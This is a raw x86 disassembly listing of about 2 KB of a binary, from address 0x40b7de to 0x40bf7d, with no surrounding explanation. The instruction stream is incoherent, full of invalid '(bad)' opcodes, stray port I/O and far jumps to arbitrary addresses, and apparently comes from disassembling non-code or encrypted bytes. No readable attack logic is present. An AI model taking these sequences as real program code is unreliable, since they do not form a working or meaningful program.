  40b7de:	stos   BYTE PTR es:[edi],al
  40b7df:	push   edi
  40b7e0:	int3   
  40b7e1:	mov    DWORD PTR [edx+0x5a],esi
  40b7e4:	mov    eax,0x6393b0f2
  40b7e9:	mov    dh,0x45
  40b7eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7ec:	jp     0x40b77b
  40b7ee:	iret   
  40b7ef:	mov    al,ds:0xfb06b8f
  40b7f4:	test   eax,0x86b36e45
  40b7f9:	pop    ebp
  40b7fa:	fimul  DWORD PTR [eiz*2+0x10102d5f]
  40b801:	fiadd  WORD PTR [edi+0x38]
  40b804:	pop    ebp
  40b805:	jne    0x40b81f
  40b807:	jno    0x40b78a
  40b809:	arpl   WORD PTR [ecx],cx
  40b80b:	aad    0xaf
  40b80d:	imul   esp,DWORD PTR [esi+0x291c133e],0x3c4b504f
  40b817:	push   edx
  40b818:	jnp    0x40b830
  40b81a:	xchg   edi,eax
  40b81b:	or     al,0x82
  40b81d:	cld    
  40b81e:	jmp    0x3200:0x6dcf68d4
  40b825:	aaa    
  40b826:	adc    dl,dh
  40b828:	aas    
  40b829:	jb     0x40b7e4
  40b82b:	pop    esi
  40b82c:	jl     0x40b877
  40b82e:	add    al,0x63
  40b830:	loope  0x40b7f8
  40b832:	cmp    al,0x62
  40b834:	pop    eax
  40b835:	pop    esp
  40b836:	add    esp,eax
  40b838:	mov    dh,0xc2
  40b83a:	lds    ecx,FWORD PTR [ecx-0x383e8be1]
  40b840:	out    0x63,al
  40b842:	(bad)  
  40b843:	outs   dx,BYTE PTR ds:[esi]
  40b844:	dec    edx
  40b845:	inc    eax
  40b846:	xor    ah,BYTE PTR [edx-0x61]
  40b849:	sub    al,0x17
  40b84b:	sbb    eax,0xad3383b1
  40b850:	retf   0x7c26
  40b853:	cmp    DWORD PTR [esi+0x23],edi
  40b856:	dec    ebx
  40b857:	ret    
  40b858:	pop    ecx
  40b859:	mov    ecx,0xbb86d05a
  40b85e:	xor    dl,BYTE PTR [ebp-0x783c5dea]
  40b864:	sub    ch,dl
  40b866:	int    0x18
  40b868:	push   esp
  40b869:	mov    bh,0xcd
  40b86b:	push   edi
  40b86c:	mov    al,0x26
  40b86e:	push   cs
  40b86f:	(bad)  
  40b870:	or     eax,0x4dc6006a
  40b875:	icebp  
  40b876:	jecxz  0x40b8f1
  40b878:	dec    edx
  40b879:	stc    
  40b87a:	mov    bh,0x81
  40b87c:	into   
  40b87d:	imul   esp,DWORD PTR [esi],0x6c7d7ce
  40b883:	retf   0x5e32
  40b886:	ds pop ebx
  40b888:	frstor [eax+0x6ea598a4]
  40b88e:	or     eax,0x78582438
  40b893:	jbe    0x40b83a
  40b895:	xor    al,BYTE PTR [ecx]
  40b897:	xchg   ebx,eax
  40b898:	rcl    DWORD PTR [edi-0x1b1eede4],0x63
  40b89f:	cmp    esi,DWORD PTR [ebx+ebx*8]
  40b8a2:	(bad)  
  40b8a3:	xchg   ebx,eax
  40b8a4:	xor    al,0x9b
  40b8a6:	mov    ecx,0xd671e34a
  40b8ab:	lds    edi,FWORD PTR [edi-0x17]
  40b8ae:	xchg   ecx,eax
  40b8af:	sar    DWORD PTR [esi],cl
  40b8b1:	xchg   BYTE PTR [edx],ch
  40b8b3:	into   
  40b8b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8b5:	jo     0x40b917
  40b8b7:	inc    edx
  40b8b8:	cdq    
  40b8b9:	cmp    DWORD PTR [ebx-0x6194c1ed],esp
  40b8bf:	pusha  
  40b8c0:	imul   eax,DWORD PTR [esi-0x2d],0xb842af23
  40b8c7:	xor    DWORD PTR [ecx],edi
  40b8c9:	clc    
  40b8ca:	ret    
  40b8cb:	and    dh,ch
  40b8cd:	retf   0xe435
  40b8d0:	jno    0x40b8c9
  40b8d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8d3:	addr16 dec ecx
  40b8d5:	push   eax
  40b8d6:	imul   esp,DWORD PTR [esi-0x53],0xffffffb5
  40b8da:	jnp    0x40b90c
  40b8dc:	pop    esp
  40b8dd:	add    bl,BYTE PTR [edx-0x5046f575]
  40b8e3:	pop    esi
  40b8e4:	pop    ss
  40b8e5:	loopne 0x40b90f
  40b8e7:	mov    ecx,0x5f66b3f2
  40b8ec:	inc    esi
  40b8ed:	inc    edx
  40b8ee:	inc    edx
  40b8ef:	sahf   
  40b8f0:	xor    DWORD PTR [ebx],0x37
  40b8f3:	and    BYTE PTR [ebx+ebp*2-0x59],ah
  40b8f7:	ss hlt 
  40b8f9:	sbb    dl,BYTE PTR [eax+eiz*4+0xa]
  40b8fd:	aaa    
  40b8fe:	sbb    al,0x92
  40b900:	add    BYTE PTR [ebx],cl
  40b902:	cmp    esp,esp
  40b904:	dec    ebx
  40b905:	test   eax,0x62faecc1
  40b90a:	shr    BYTE PTR ds:0xc5ddbb02,1
  40b910:	xor    ebx,ecx
  40b912:	dec    eax
  40b913:	out    dx,eax
  40b914:	in     eax,0x41
  40b916:	xchg   ecx,eax
  40b917:	out    dx,eax
  40b918:	(bad)  
  40b919:	fild   DWORD PTR [esi+0x1970a457]
  40b91f:	adc    ebp,DWORD PTR [edi-0x7567d53e]
  40b925:	outs   dx,BYTE PTR ds:[esi]
  40b926:	arpl   WORD PTR ss:[ecx+0x6a],sp
  40b92a:	inc    eax
  40b92b:	jno    0x40b961
  40b92d:	hlt    
  40b92e:	xor    al,0x19
  40b930:	imul   BYTE PTR [edi+0x55]
  40b933:	push   esi
  40b934:	mov    ds:0x417e8cbf,eax
  40b939:	push   0xbe7a0b47
  40b93e:	pop    edi
  40b93f:	test   DWORD PTR [ecx+ebp*4-0x53],ecx
  40b943:	and    ah,BYTE PTR [ebp-0x62]
  40b946:	ret    0x2d3
  40b949:	cmp    esp,esp
  40b94b:	dec    edi
  40b94c:	(bad)  
  40b94e:	and    al,0xf6
  40b950:	mov    al,ds:0xc9f6de3
  40b955:	mov    ds:0x9cf5d297,al
  40b95a:	es fs jae 0x40b8ec
  40b95e:	and    DWORD PTR [edx-0xf],eax
  40b961:	cwde   
  40b962:	ror    BYTE PTR [ecx-0x55],cl
  40b965:	jmp    0xd11a903
  40b96a:	js     0x40b95e
  40b96c:	cmp    eax,edx
  40b96e:	mov    ah,bh
  40b970:	lds    edi,FWORD PTR [ebp-0x45c48be7]
  40b976:	and    DWORD PTR [edi-0x11a27641],ebx
  40b97c:	test   eax,0x1d4151c4
  40b981:	pop    eax
  40b982:	add    DWORD PTR [ebx+0x61],edi
  40b985:	shl    DWORD PTR [ebp-0x5fa2156b],0x4a
  40b98c:	sbb    dl,BYTE PTR [ebx]
  40b98e:	scas   al,BYTE PTR es:[di]
  40b990:	mov    esi,0xada83a7b
  40b995:	mov    ecx,0xb34d0074
  40b99a:	repnz in eax,dx
  40b99c:	jg     0x40ba04
  40b99e:	sbb    eax,0x8f546368
  40b9a3:	cmp    al,0xdf
  40b9a5:	cmp    al,0xab
  40b9a7:	out    dx,eax
  40b9a8:	sub    al,0x8e
  40b9aa:	xor    eax,0xc6348618
  40b9af:	fs repz scas al,BYTE PTR es:[edi]
  40b9b2:	inc    esp
  40b9b3:	jne    0x40b9e6
  40b9b5:	or     edi,DWORD PTR [esi+0x37]
  40b9b8:	ds add al,0x80
  40b9bb:	xor    BYTE PTR [ebx+0x3ef22c1f],bh
  40b9c1:	int    0xc4
  40b9c3:	rcr    DWORD PTR [ebx-0x1],1
  40b9c6:	jnp    0x40ba16
  40b9c8:	je     0x40ba2a
  40b9ca:	cdq    
  40b9cb:	jne    0x40b953
  40b9cd:	sbb    bh,ch
  40b9cf:	cwde   
  40b9d0:	or     BYTE PTR [edi],0x6f
  40b9d3:	sar    DWORD PTR [esi-0x13],cl
  40b9d6:	mov    DWORD PTR [ecx+0x4d43c69],esp
  40b9dc:	outs   dx,DWORD PTR ds:[esi]
  40b9dd:	nop
  40b9de:	jle    0x40b97d
  40b9e0:	ins    BYTE PTR es:[edi],dx
  40b9e1:	lea    esi,[edx]
  40b9e3:	(bad)  
  40b9e4:	pop    ebp
  40b9e5:	dec    ebp
  40b9e6:	fcmovb st,st(7)
  40b9e8:	cwde   
  40b9e9:	mov    ch,0x85
  40b9eb:	and    BYTE PTR [ebx-0x1a2af9f7],cl
  40b9f1:	inc    esi
  40b9f2:	mov    DWORD PTR [ecx+eax*2],ebx
  40b9f5:	mov    bl,0xb2
  40b9f7:	repz test al,0xc6
  40b9fa:	mov    sp,0x614b
  40b9fe:	daa    
  40b9ff:	(bad)  
  40ba00:	ins    BYTE PTR es:[edi],dx
  40ba01:	cmp    eax,0xb1162246
  40ba06:	mov    ebx,DWORD PTR [ebx+ebx*2-0x5a861d0]
  40ba0d:	adc    ch,BYTE PTR [ebx+0x461b8af9]
  40ba13:	push   esp
  40ba14:	stos   DWORD PTR es:[edi],eax
  40ba15:	test   DWORD PTR [eax+0x5bc69fbe],eax
  40ba1b:	push   esp
  40ba1c:	jge    0x40ba3d
  40ba1e:	fadd   st,st(1)
  40ba20:	and    al,0x2d
  40ba22:	push   esp
  40ba23:	cwde   
  40ba24:	mov    cl,0x8
  40ba26:	pop    esp
  40ba27:	cdq    
  40ba28:	jnp    0x40b9f4
  40ba2a:	dec    edx
  40ba2b:	and    BYTE PTR [esi-0x15],bl
  40ba2e:	pop    esi
  40ba2f:	int    0x17
  40ba31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba32:	mov    al,0xf6
  40ba34:	inc    ebp
  40ba35:	mov    ebx,0x9ae739b7
  40ba3a:	adc    ebx,DWORD PTR ds:0x15afde95
  40ba40:	int    0xb6
  40ba42:	fsubr  st,st(7)
  40ba44:	ret    0x564b
  40ba47:	repz push ds
  40ba49:	inc    eax
  40ba4a:	pop    esi
  40ba4b:	ror    BYTE PTR [esi+0x52],1
  40ba4e:	adc    WORD PTR ds:0xe27ce0e8,si
  40ba55:	into   
  40ba56:	jg     0x40ba30
  40ba58:	and    BYTE PTR [eax-0x68],cl
  40ba5b:	sub    BYTE PTR [ebp+0x6d512a5f],dh
  40ba61:	retf   0x9e2a
  40ba64:	in     al,0xe4
  40ba66:	(bad)  
  40ba67:	fldcw  WORD PTR [edi]
  40ba69:	jecxz  0x40ba85
  40ba6b:	imul   esi,DWORD PTR [edi-0x360d86c1],0x462e9578
  40ba75:	enter  0x2250,0x93
  40ba79:	add    ecx,edi
  40ba7b:	mov    esp,0x52bebe70
  40ba80:	cmp    edx,ebp
  40ba82:	retf   0x3bde
  40ba85:	pop    esi
  40ba86:	aaa    
  40ba87:	inc    esi
  40ba88:	pop    ss
  40ba89:	retf   
  40ba8a:	inc    edi
  40ba8b:	xor    DWORD PTR [edx],ebx
  40ba8d:	xor    DWORD PTR [ebp+0x71788618],0x443f05a5
  40ba97:	scas   eax,DWORD PTR es:[edi]
  40ba98:	arpl   WORD PTR [ecx+0x5a089f09],cx
  40ba9e:	into   
  40ba9f:	ret    
  40baa0:	xor    eax,0x848294b9
  40baa5:	(bad)
  40baa9:	cmp    al,BYTE PTR [eax-0xfb2e0e4]
  40baaf:	mov    eax,ds:0xa87cd457
  40bab4:	sub    al,0xb5
  40bab6:	fisub  DWORD PTR [ebx]
  40bab8:	pop    ebp
  40bab9:	stos   DWORD PTR es:[edi],eax
  40baba:	jle    0x40ba8c
  40babc:	inc    ebp
  40babd:	xchg   edx,eax
  40babe:	aam    0x1b
  40bac0:	push   eax
  40bac1:	jmp    0xc17a:0xd95bc691
  40bac8:	pop    edx
  40bac9:	and    dh,al
  40bacb:	jb     0x40ba4d
  40bacd:	cmp    edi,ebp
  40bacf:	int3   
  40bad0:	pop    ss
  40bad1:	daa    
  40bad2:	push   edx
  40bad3:	xchg   esi,eax
  40bad4:	repnz xor al,0x4b
  40bad7:	arpl   WORD PTR [edx],sp
  40bad9:	in     eax,dx
  40bada:	aaa    
  40badb:	pop    ecx
  40badc:	pop    esi
  40badd:	mov    ah,0x71
  40badf:	stc    
  40bae0:	add    DWORD PTR ds:0x80deea15,ebx
  40bae6:	mov    BYTE PTR [ebx],0xbd
  40bae9:	idiv   cl
  40baeb:	loopne 0x40bb63
  40baed:	leave  
  40baee:	push   esp
  40baef:	mov    eax,ds:0x834ed4c6
  40baf4:	aad    0x74
  40baf6:	out    dx,al
  40baf7:	or     ebx,ebx
  40baf9:	push   ecx
  40bafa:	push   esp
  40bafb:	sbb    ebp,ecx
  40bafd:	push   eax
  40bafe:	pop    eax
  40baff:	push   0xffffffc2
  40bb01:	imul   esp,DWORD PTR [esi],0xffffffcd
  40bb04:	aam    0xfa
  40bb06:	lock dec eax
  40bb08:	fs dec esi
  40bb0a:	jmp    0xca02:0x10865410
  40bb11:	dec    edi
  40bb12:	rcl    DWORD PTR [ebx+0xf],1
  40bb15:	cmp    eax,0x22758c10
  40bb1a:	daa    
  40bb1b:	push   ecx
  40bb1c:	retf   
  40bb1d:	pop    ecx
  40bb1e:	fimul  WORD PTR [ecx]
  40bb20:	adc    dh,BYTE PTR [edx]
  40bb22:	sbb    ch,al
  40bb24:	mov    esi,0x96cefadf
  40bb29:	es aas 
  40bb2b:	xchg   edx,eax
  40bb2c:	les    ebx,FWORD PTR [esi]
  40bb2e:	mov    ecx,0x5701ba1
  40bb33:	mov    dl,0xbe
  40bb35:	push   ecx
  40bb36:	out    0xa9,al
  40bb38:	mov    esi,0x11b47464
  40bb3d:	mov    esi,0xb1611990
  40bb42:	adc    eax,0x525151f0
  40bb47:	mov    ebx,esi
  40bb49:	not    edx
  40bb4b:	mov    esp,edi
  40bb4d:	mov    al,ds:0x25b90b70
  40bb52:	add    edi,DWORD PTR [ecx+0x75]
  40bb55:	fwait
  40bb56:	or     cl,BYTE PTR [eax+0x6d]
  40bb59:	jbe    0x40bb57
  40bb5b:	sbb    esp,DWORD PTR [ecx]
  40bb5d:	lods   eax,DWORD PTR ds:[esi]
  40bb5e:	cmp    al,0x99
  40bb60:	in     al,dx
  40bb61:	adc    ah,BYTE PTR [esi+ebp*2-0x7dcc42e2]
  40bb68:	hlt    
  40bb69:	pusha  
  40bb6a:	(bad)  
  40bb6b:	sbb    eax,0x66a87756
  40bb70:	xor    edi,DWORD PTR [ebx+0x61e9d731]
  40bb76:	aam    0xf1
  40bb78:	cmp    DWORD PTR [ecx+0x38],ecx
  40bb7b:	mov    ah,0x65
  40bb7d:	sbb    BYTE PTR [eax+0x0],ah
  40bb80:	ret    0xaf1e
  40bb83:	adc    BYTE PTR [eax-0xa0dbccc],dh
  40bb89:	jne    0x40bbb3
  40bb8b:	push   edx
  40bb8c:	sbb    DWORD PTR [esi],edi
  40bb8e:	fadd   DWORD PTR [edx+0x5b]
  40bb91:	inc    edi
  40bb92:	xchg   esp,eax
  40bb93:	and    BYTE PTR [edx+0x38],dl
  40bb96:	rol    esi,cl
  40bb98:	sub    BYTE PTR [ebp+0x2dd88206],0xe3
  40bb9f:	sahf   
  40bba0:	pop    ebp
  40bba1:	dec    esp
  40bba2:	aam    0x78
  40bba4:	or     edx,esp
  40bba6:	ins    BYTE PTR es:[edi],dx
  40bba7:	adc    al,0x3c
  40bba9:	mov    ebp,0x7097c5cb
  40bbae:	xchg   edx,eax
  40bbaf:	xchg   esp,eax
  40bbb0:	or     al,BYTE PTR [eax]
  40bbb2:	cmp    al,al
  40bbb4:	ins    DWORD PTR es:[edi],dx
  40bbb5:	jbe    0x40bbf7
  40bbb7:	imul   esp,DWORD PTR [ecx-0x32],0x21d52e51
  40bbbe:	pop    esp
  40bbbf:	mov    esp,0x69601af0
  40bbc4:	shl    DWORD PTR [esp+ecx*8-0x72],cl
  40bbc8:	sar    BYTE PTR [esp+ecx*4-0x1b36e84],1
  40bbcf:	ja     0x40bc06
  40bbd1:	mov    esi,0x4ab49d72
  40bbd6:	ret    0x65ca
  40bbd9:	hlt    
  40bbda:	arpl   WORD PTR [edi+0x7bae5b45],sp
  40bbe0:	adc    esi,DWORD PTR [ecx-0x9c94d68]
  40bbe6:	dec    ebx
  40bbe7:	ss fwait
  40bbe9:	xchg   edi,eax
  40bbea:	je     0x40bc19
  40bbec:	cld    
  40bbed:	sti    
  40bbee:	mov    al,ds:0x651a5aa
  40bbf3:	inc    ebp
  40bbf4:	icebp  
  40bbf5:	in     al,dx
  40bbf6:	test   BYTE PTR [ebp+0xe],ch
  40bbf9:	pop    ss
  40bbfa:	pop    edx
  40bbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbfc:	daa    
  40bbfd:	push   ecx
  40bbfe:	xor    ebp,ebx
  40bc00:	add    bl,dh
  40bc02:	cwde   
  40bc03:	mul    ah
  40bc05:	add    dh,BYTE PTR ds:0x67588c7e
  40bc0b:	fisttp WORD PTR [edx]
  40bc0d:	les    edi,FWORD PTR [ecx]
  40bc0f:	inc    ecx
  40bc10:	add    eax,0x4a649bae
  40bc15:	ins    DWORD PTR es:[edi],dx
  40bc16:	cmp    BYTE PTR [ebp+0x29],dh
  40bc19:	(bad)  
  40bc1a:	loope  0x40bc13
  40bc1c:	inc    ebp
  40bc1d:	jne    0x40bc56
  40bc1f:	dec    esi
  40bc20:	(bad)
  40bc23:	push   esp
  40bc24:	xchg   edx,eax
  40bc25:	ds jl  0x40bc4a
  40bc28:	das    
  40bc29:	inc    ecx
  40bc2a:	gs mov ah,0x74
  40bc2d:	lds    esi,FWORD PTR [edi+0x7b370f5b]
  40bc33:	mov    fs,WORD PTR [eax+edx*4-0x74b5aed5]
  40bc3a:	or     eax,0x6712cdc3
  40bc3f:	xchg   ebp,eax
  40bc40:	ss sbb ch,ch
  40bc43:	sub    DWORD PTR [eax+esi*4+0x38],edx
  40bc47:	or     eax,DWORD PTR [edi-0x37eb2516]
  40bc4d:	xlat   BYTE PTR ds:[ebx]
  40bc4e:	in     al,0xa1
  40bc50:	(bad)  
  40bc51:	daa    
  40bc52:	fnstsw WORD PTR [ebx-0x49b15c73]
  40bc58:	inc    edx
  40bc59:	mov    ebp,0xc37f48f4
  40bc5e:	push   0x4
  40bc60:	in     al,0x5f
  40bc62:	inc    edx
  40bc63:	mov    edi,0xf3ad1960
  40bc68:	and    ebp,DWORD PTR [ebp-0x37b14f61]
  40bc6e:	imul   eax,DWORD PTR [ecx],0x21
  40bc71:	call   0xd6f5f1dd
  40bc76:	and    DWORD PTR [esi+0x60ca7806],esi
  40bc7c:	test   eax,0x1f52608f
  40bc81:	jmp    0x7a6c:0xae141d89
  40bc88:	in     al,0xca
  40bc8a:	sub    edi,edx
  40bc8c:	lods   al,BYTE PTR ds:[esi]
  40bc8d:	aam    0xdc
  40bc8f:	jl     0x40bcf6
  40bc91:	out    0xae,eax
  40bc93:	fs mov ecx,0x58b08289
  40bc99:	je     0x40bc36
  40bc9b:	rcr    BYTE PTR [edi+0x781ef7a3],1
  40bca1:	sbb    ecx,esi
  40bca3:	sbb    BYTE PTR [ecx+0x5f155512],0x55
  40bcaa:	push   esp
  40bcab:	inc    edi
  40bcac:	push   0xffffffa2
  40bcae:	arpl   di,sp
  40bcb0:	int3   
  40bcb1:	fs mov eax,0x31342b62
  40bcb7:	dec    ecx
  40bcb8:	dec    eax
  40bcb9:	xor    BYTE PTR [eax+0x8],cl
  40bcbc:	fiadd  DWORD PTR [ebx+eiz*1+0x59]
  40bcc0:	xchg   esi,eax
  40bcc1:	mov    ch,0x35
  40bcc3:	inc    bx
  40bcc5:	jmp    0x40bd01
  40bcc7:	inc    esp
  40bcc8:	adc    DWORD PTR [ebp-0x397e3830],eax
  40bcce:	aaa    
  40bccf:	retf   
  40bcd0:	mov    dl,BYTE PTR ds:0xaf295a92
  40bcd6:	and    ch,BYTE PTR [edx+0x57]
  40bcd9:	and    BYTE PTR [eax+0x1b],bh
  40bcdc:	mov    ebp,DWORD PTR [ebp+0x472439c6]
  40bce2:	dec    ebp
  40bce3:	repnz (bad) 
  40bce5:	jg     0x40bcde
  40bce7:	fist   WORD PTR [eax]
  40bce9:	ds dec eax
  40bceb:	or     bl,BYTE PTR [eax+0x6f0214f6]
  40bcf1:	adc    ch,bl
  40bcf3:	jne    0x40bd0b
  40bcf5:	jle    0x40bd39
  40bcf7:	aas    
  40bcf8:	imul   eax,ecx,0x19
  40bcfb:	les    ecx,FWORD PTR [eax+edi*1-0x4b]
  40bcff:	repz mov edi,DWORD PTR es:[edx+0x67]
  40bd04:	lea    edi,[ecx+eiz*4+0x76]
  40bd08:	jne    0x40bcce
  40bd0a:	mov    BYTE PTR [edi+edx*4],al
  40bd0d:	xchg   BYTE PTR [esi-0x75],al
  40bd10:	dec    ebp
  40bd11:	mov    DWORD PTR [ecx],0x21a70aa
  40bd17:	rol    BYTE PTR [esi*2-0x4e6812d7],cl
  40bd1e:	ret    0x30f5
  40bd21:	mov    ch,0x2
  40bd23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd24:	add    DWORD PTR [ebx+0x2e],ebx
  40bd27:	push   eax
  40bd28:	push   0x8072f238
  40bd2d:	das    
  40bd2e:	and    al,BYTE PTR [esi+0xd98da7]
  40bd34:	arpl   WORD PTR [ebx],sp
  40bd36:	mov    eax,0xf2716dee
  40bd3b:	loope  0x40bd3a
  40bd3d:	call   0xd0e6:0x199a742c
  40bd44:	pop    es
  40bd45:	pop    esi
  40bd46:	jge    0x40bd48
  40bd48:	enter  0x703c,0xb4
  40bd4c:	jmp    0x6990:0x85e4f9b2
  40bd53:	lds    esi,FWORD PTR [ebp-0x32b24fe5]
  40bd59:	adc    eax,0x2c5c76ae
  40bd5e:	pushf  
  40bd5f:	jg     0x40bd43
  40bd61:	jae    0x40bd73
  40bd63:	vmread DWORD PTR [edi],edi
  40bd66:	daa    
  40bd67:	xchg   esi,eax
  40bd68:	dec    ebp
  40bd69:	lds    edx,FWORD PTR [edi]
  40bd6b:	leave  
  40bd6c:	lock mov dh,0x97
  40bd6f:	jmp    0x9003:0xac49d723
  40bd76:	pusha  
  40bd77:	(bad)  
  40bd78:	hlt    
  40bd79:	pop    eax
  40bd7a:	lods   eax,DWORD PTR ds:[esi]
  40bd7b:	popf   
  40bd7c:	jns    0x40bdd9
  40bd7e:	leave  
  40bd7f:	xor    DWORD PTR [ebx-0x55],0xffffff84
  40bd83:	into   
  40bd84:	leave  
  40bd85:	fwait
  40bd86:	push   edi
  40bd87:	mov    dl,0x62
  40bd89:	ins    BYTE PTR es:[edi],dx
  40bd8a:	cmc    
  40bd8b:	cmp    edi,DWORD PTR [edx-0x62]
  40bd8e:	xchg   ebp,eax
  40bd8f:	stos   BYTE PTR es:[edi],al
  40bd90:	retf   
  40bd91:	outs   dx,DWORD PTR ds:[esi]
  40bd92:	out    0x6d,al
  40bd94:	sbb    bl,BYTE PTR [ebx]
  40bd96:	out    0xd1,eax
  40bd98:	rcl    BYTE PTR [edx+eax*8-0xf587c7c],cl
  40bd9f:	sbb    edi,eax
  40bda1:	pop    ebp
  40bda2:	popa   
  40bda3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bda4:	in     eax,0xff
  40bda6:	(bad)  
  40bda7:	out    dx,eax
  40bda8:	icebp  
  40bda9:	or     al,0x70
  40bdab:	in     al,dx
  40bdac:	ja     0x40bdf8
  40bdae:	jo     0x40be07
  40bdb0:	or     eax,DWORD PTR [ecx+0x3f]
  40bdb3:	pop    eax
  40bdb4:	push   eax
  40bdb5:	call   0x9dd52aeb
  40bdba:	inc    esi
  40bdbb:	rol    esi,1
  40bdbd:	jmp    0xf53a2b65
  40bdc2:	xor    esi,DWORD PTR [ebp-0x48]
  40bdc5:	push   0xfa8102d4
  40bdca:	mov    al,0xe1
  40bdcc:	test   ecx,ebx
  40bdce:	mov    ds:0x6cc3e69a,eax
  40bdd3:	je     0x40be20
  40bdd5:	lock das 
  40bdd7:	mov    bl,dh
  40bdd9:	push   0xdf3e57b0
  40bdde:	neg    al
  40bde0:	nop
  40bde1:	sub    BYTE PTR [edx],dh
  40bde3:	mov    ebp,0x69812ac0
  40bde8:	mov    ds:0x810124c5,al
  40bded:	xorps  xmm7,XMMWORD PTR [edx-0xa]
  40bdf1:	mov    bh,0x11
  40bdf3:	push   esp
  40bdf4:	jbe    0x40bd85
  40bdf6:	jmp    0x98314995
  40bdfb:	lea    esi,[edx]
  40bdfd:	cmp    al,0x8c
  40bdff:	sbb    eax,0x6c6926f9
  40be04:	sbb    DWORD PTR [ecx+0x7a],esp
  40be07:	stos   DWORD PTR es:[edi],eax
  40be08:	or     al,BYTE PTR [ecx-0x4a4c559]
  40be0e:	jno    0x40be00
  40be10:	addr16 imul ebp,esp,0x37
  40be14:	inc    eax
  40be15:	les    ebp,FWORD PTR [ebx]
  40be17:	push   0x6d
  40be19:	sti    
  40be1a:	pop    ds
  40be1b:	cmp    bh,0x6f
  40be1e:	jle    0x40be3c
  40be20:	jae    0x40be4f
  40be22:	push   0x5bbd9542
  40be27:	cmp    eax,0x5cb653be
  40be2c:	fucomi st,st(2)
  40be2e:	jl     0x40bea9
  40be30:	lods   eax,DWORD PTR ds:[esi]
  40be31:	jno    0x40be5d
  40be33:	sub    bh,dl
  40be35:	push   0x43
  40be37:	arpl   WORD PTR [eax],bp
  40be39:	mov    esp,0xb1900ca9
  40be3e:	sub    BYTE PTR [esi],ah
  40be40:	fisubr WORD PTR [ebx]
  40be42:	pushf  
  40be43:	mov    ds:0xe28cc122,eax
  40be48:	fmul   DWORD PTR [ebp-0x12]
  40be4b:	bound  esp,QWORD PTR [edx]
  40be4d:	fisub  WORD PTR ds:0x33018f94
  40be53:	icebp  
  40be54:	dec    ebx
  40be55:	shl    DWORD PTR [ebp+0x16],1
  40be58:	ja     0x40be08
  40be5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be5b:	call   0xa727aa86
  40be60:	js     0x40be15
  40be62:	rcl    esp,1
  40be64:	pop    ebp
  40be65:	push   es
  40be66:	or     BYTE PTR [edx-0x5e],dh
  40be69:	(bad)  
  40be6b:	js     0x40bedf
  40be6d:	push   edx
  40be6e:	xchg   BYTE PTR ds:0x5a5b9ef9,dh
  40be74:	and    esi,DWORD PTR [edi-0x2f794f58]
  40be7a:	sub    eax,0xa5c8f17c
  40be7f:	jmp    0x11d5b62a
  40be84:	push   es
  40be85:	mov    ebx,0x4c3078a0
  40be8a:	ficomp DWORD PTR [edi-0x5a8e37a9]
  40be90:	pop    DWORD PTR [ebx+0x3]
  40be93:	inc    esp
  40be94:	mov    ecx,0x46054dbc
  40be99:	imul   ebp,edi,0xc2d0c567
  40be9f:	sub    BYTE PTR [eax],al
  40bea1:	cdq    
  40bea2:	or     al,0x1b
  40bea4:	jo     0x40becb
  40bea6:	mov    esp,0x178bc571
  40beab:	in     eax,dx
  40beac:	mov    ah,0x9f
  40beae:	pop    ss
  40beaf:	and    DWORD PTR [esi],ebp
  40beb1:	(bad)  
  40beb2:	push   edx
  40beb3:	jo     0x40bed7
  40beb5:	sub    al,0xd4
  40beb7:	ins    DWORD PTR es:[edi],dx
  40beb8:	sub    al,0xef
  40beba:	inc    BYTE PTR [esi+0x40]
  40bebd:	lds    edx,FWORD PTR [esi-0x5114c351]
  40bec3:	test   ah,0xa8
  40bec6:	into   
  40bec7:	push   ebp
  40bec8:	xchg   esp,eax
  40bec9:	xor    eax,0xf48e77ed
  40bece:	pop    esp
  40becf:	sbb    BYTE PTR [edi],cl
  40bed1:	and    BYTE PTR [esi],dh
  40bed3:	sbb    DWORD PTR [ebp+0xdaae165],0x2a
  40beda:	mov    bl,0xb0
  40bedc:	jne    0x40bed1
  40bede:	push   edx
  40bedf:	aas    
  40bee0:	mov    ecx,0xdb46dd64
  40bee5:	or     BYTE PTR [eax+0x717c7eb0],ah
  40beeb:	nop
  40beec:	fsub   DWORD PTR ds:0x3d72564a
  40bef2:	adc    DWORD PTR [esi],edi
  40bef4:	inc    esp
  40bef5:	push   ds
  40bef6:	pop    ds
  40bef7:	and    BYTE PTR [eax+0x4a1393ed],al
  40befd:	push   ecx
  40befe:	sub    al,0xf
  40bf00:	mov    ?,WORD PTR [edi+0x1db71863]
  40bf06:	dec    esi
  40bf07:	xlat   BYTE PTR ds:[ebx]
  40bf08:	call   0x86ff:0x324e6cb1
  40bf0f:	pop    eax
  40bf10:	push   esp
  40bf11:	pop    ecx
  40bf12:	and    BYTE PTR [edi-0xe89f117],cl
  40bf18:	jl     0x40bf40
  40bf1a:	call   0xcdb05e98
  40bf1f:	rcr    DWORD PTR [ebp-0x6224c133],cl
  40bf25:	call   0x6a51:0xbb56348b
  40bf2c:	mov    al,ds:0xae9295ea
  40bf31:	repnz popa 
  40bf33:	push   0xb17a1d89
  40bf38:	pop    ss
  40bf39:	add    eax,0xdc1a20eb
  40bf3e:	jno    0x40bf8b
  40bf40:	jg     0x40bfb2
  40bf42:	jecxz  0x40bed0
  40bf44:	es in  al,0xd
  40bf47:	(bad)  
  40bf48:	mov    WORD PTR [esi+ecx*1],?
  40bf4b:	addr16 int3 
  40bf4d:	out    dx,al
  40bf4e:	repz in eax,0xb4
  40bf51:	push   eax
  40bf52:	or     DWORD PTR [edx-0x5ad9cb4f],ecx
  40bf58:	test   DWORD PTR [ecx-0x30156d16],esi
  40bf5e:	mov    ah,0x5b
  40bf60:	inc    esp
  40bf61:	dec    edi
  40bf62:	test   al,0x2f
  40bf64:	xor    al,0x99
  40bf66:	xchg   DWORD PTR [ebp+0x1562818a],esi
  40bf6c:	xor    BYTE PTR [ebx-0x2e242fb4],al
  40bf72:	dec    esp
  40bf73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf74:	jnp    0x40bfb8
  40bf76:	push   0xffffffe9
  40bf78:	mov    ds:0x2c93607d,eax
  40bf7d:	gs jb  0x40bf99
